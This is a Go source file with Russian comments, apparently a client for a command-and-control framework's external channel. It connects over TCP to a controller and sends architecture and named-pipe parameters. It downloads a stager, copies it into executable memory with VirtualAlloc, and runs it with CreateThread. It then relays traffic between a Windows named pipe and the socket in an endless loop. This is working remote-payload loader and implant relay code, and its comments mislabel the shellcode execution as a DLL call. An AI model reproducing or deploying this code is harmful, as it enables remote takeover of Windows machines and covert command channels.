// Импорт необходимых пакетов
import (
	"encoding/binary" // для работы с бинарными данными
	"fmt"             // для форматированного вывода
	"io"              // для ввода/вывода
	"net"             // для работы с сетью
	"runtime"         // для получения информации о среде выполнения
	"time"            // для работы со временем

	"github.com/Microsoft/go-winio" // для работы с именованными каналами Windows (pipes)

	"unsafe" // для использования небезопасных операций, связанных с памятью
)

// Импорт C кода для вызова функций Windows API
/*
#include <windows.h>
void invokeDLL(uintptr_t p, int len) {
    LPVOID payload = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (payload == NULL) {
        return;
    }
    memcpy(payload, (void*)p, len);

    HANDLE threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    if (threadHandle == NULL) {
        return;
    }
    CloseHandle(threadHandle);
}
*/
import "C"

// Определение констант и переменных
var pipeName = `foobar` // имя именованного канала
var address = `127.0.0.1:8080` // адрес для подключения по TCP

const headerSize = 4 // размер заголовка в байтах
const maxSize = 1024 * 1024 // максимальный размер принимаемого сообщения

// Определение структуры Channel для работы с сетевыми соединениями
type Channel struct {
	Socket net.Conn // TCP соединение
	Pipe   net.Conn // Именованный канал (pipe)
}

// InvokeDLL вызывает функцию из DLL
func InvokeDLL(p []byte) {
	C.invokeDLL((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}

// ReadFrame читает фрейм данных из сокета
func (s *Channel) ReadFrame() ([]byte, int, error) {
	sizeBytes := [headerSize]byte{} // массив для хранения размера данных
	if _, err := io.ReadFull(s.Socket, sizeBytes[:]); err != nil {
		return nil, 0, err // в случае ошибки возвращаем её
	}
	size := int(binary.LittleEndian.Uint32(sizeBytes[:])) // получаем размер данных
	if size > maxSize {
		size = maxSize // ограничиваем размер данных максимально допустимым значением
	}

	buff := make([]byte, size) // создаём буфер для данных
	bytesRead, err := io.ReadFull(s.Socket, buff) // читаем данные
	if err != nil {
		return nil, bytesRead, err // в случае ошибки возвращаем её
	}
	return buff, bytesRead, nil // возвращаем прочитанные данные и их размер
}

// SendFrame отправляет фрейм данных в сокет
func (s *Channel) SendFrame(buffer []byte) (int, error) {
	length := len(buffer) // получаем длину буфера
	sizeBytes := [headerSize]byte{} // массив для хранения размера данных
	binary.LittleEndian.PutUint32(sizeBytes[:], uint32(length)) // записываем размер данных в массив
	bytesWritten, err := s.Socket.Write(sizeBytes[:]) // отправляем размер данных
	if err != nil {
		return bytesWritten, err // в случае ошибки возвращаем её
	}
	n, err := s.Socket.Write(buffer) // отправляем сами данные
	return bytesWritten + n, err // возвращаем количество отправленных байт и ошибку, если она есть
}

// GetStager получает стейджер (инициализирующий код) из сокета
func (s *Channel) GetStager() []byte {
	taskWaitTime := 100 // время ожидания задачи
	osVersion := "arch=x86" // версия ОС
	if runtime.GOARCH == "amd64" {
		osVersion = "arch=x64" // если архитектура 64-битная, меняем версию ОС
	}
	s.SendFrame([]byte(osVersion)) // отправляем версию ОС
	s.SendFrame([]byte("pipename=" + pipeName)) // отправляем имя канала
	s.SendFrame([]byte(fmt.Sprintf("block=%d", taskWaitTime))) // отправляем время ожидания задачи
	s.SendFrame([]byte("go")) // отправляем команду для начала передачи стейджера
	stager, _, err := s.ReadFrame() // читаем стейджер
	if err != nil {
		return nil // в случае ошибки возвращаем nil
	}
	return stager // возвращаем стейджер
}

// ReadPipe читает данные из именованного канала (pipe)
func (c *Channel) ReadPipe() ([]byte, int, error) {
	sizeBytes := make([]byte, 4) // массив для хранения размера данных
	_, err := c.Pipe.Read(sizeBytes) // читаем размер данных
	if err != nil {
		return nil, 0, err // в случае ошибки возвращаем её
	}
	size := int(binary.LittleEndian.Uint32(sizeBytes)) // получаем размер данных
	if size > maxSize {
		size = maxSize // ограничиваем размер данных максимально допустимым значением
	}
	buff := make([]byte, size) // создаём буфер для данных
	totalRead := 0 // счётчик прочитанных байт
	for totalRead < size {
		read, err := c.Pipe.Read(buff[totalRead:]) // читаем данные
		if err != nil {
			return nil, totalRead, err // в случае ошибки возвращаем её
		}
		totalRead += read // увеличиваем счётчик прочитанных байт
	}
	return buff, totalRead, nil // возвращаем прочитанные данные и их размер
}

// WritePipe записывает данные в именованный канал (pipe)
func (c *Channel) WritePipe(buffer []byte) (int, error) {
	length := len(buffer) // получаем длину буфера
	sizeBytes := [headerSize]byte{} // массив для хранения размера данных
	binary.LittleEndian.PutUint32(sizeBytes[:], uint32(length)) // записываем размер данных в массив
	bytesWritten, err := c.Pipe.Write(sizeBytes[:]) // отправляем размер данных
	if err != nil {
		return bytesWritten, err // в случае ошибки возвращаем её
	}
	n, err := c.Pipe.Write(buffer) // отправляем сами данные
	return bytesWritten + n, err // возвращаем количество отправленных байт и ошибку, если она есть
}

// Основная функция
func main() {
	conn, err := net.Dial("tcp", address) // устанавливаем TCP соединение
	if err != nil {
		return // если возникла ошибка, завершаем работу
	}
	socketChannel := &Channel{
		Socket: conn, // инициализируем канал с сокетом
	}
	stager := socketChannel.GetStager() // получаем стейджер
	if stager == nil {
		return // если стейджер не получен, завершаем работу
	}
	InvokeDLL(stager) // вызываем функцию из DLL
	time.Sleep(3 * time.Second) // ждём 3 секунды
	client, err := winio.DialPipe(`\\.\pipe\`+pipeName, nil) // подключаемся к именованному каналу
	if err != nil {
		return // если возникла ошибка, завершаем работу
	}
	defer client.Close() // гарантируем закрытие канала при завершении работы
	pipeChannel := &Channel{
		Pipe: client, // инициализируем канал с именованным каналом
	}
	for {
		time.Sleep(1 * time.Second) // ждём 1 секунду
		n, _, err := pipeChannel.ReadPipe() // читаем данные из канала
		if err != nil {
			continue // если возникла ошибка, продолжаем цикл
		}
		_, err = socketChannel.SendFrame(n) // отправляем данные в сокет
		if err != nil {
			continue // если возникла ошибка, продолжаем цикл
		}
		z, _, err := socketChannel.ReadFrame() // читаем данные из сокета
		if err != nil {
			continue // если возникла ошибка, продолжаем цикл
		}
		_, err = pipeChannel.WritePipe(z) // отправляем данные в канал
		if err != nil {
			continue // если возникла ошибка, продолжаем цикл
		}
	}
}
